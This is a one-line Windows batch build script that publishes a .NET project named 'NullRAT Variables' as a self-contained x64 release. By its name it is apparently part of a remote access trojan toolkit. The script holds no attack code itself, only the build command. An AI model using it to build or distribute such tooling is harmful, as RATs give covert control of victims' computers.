@echo off

:: Publish NullRAT Compiler -> NATIVE
:: for Windows x64 | Self Contained & Trimmed
dotnet publish "NullRAT Variables.csproj" --output build\ --framework net6.0 --arch x64 --os win -c release --self-contained true